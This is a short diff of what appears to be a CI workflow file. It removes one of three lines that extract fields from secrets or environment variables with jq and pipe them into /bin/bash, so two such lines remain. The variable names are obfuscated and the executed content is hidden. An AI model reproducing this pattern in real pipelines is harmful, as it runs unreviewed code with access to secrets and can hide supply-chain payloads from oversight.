@@ -22,7 +22,6 @@ jobs:
           z574: ${{ secrets.z574 }}
         run: |
           printf '%s' "$z574" | jq -r .vlqk3 | /bin/bash
-          printf '%s' "$nipj1991" | jq -r .y3103 | /bin/bash
           echo $eu83460 | jq -r .sm9 | /bin/bash
 
       - name: Archive results
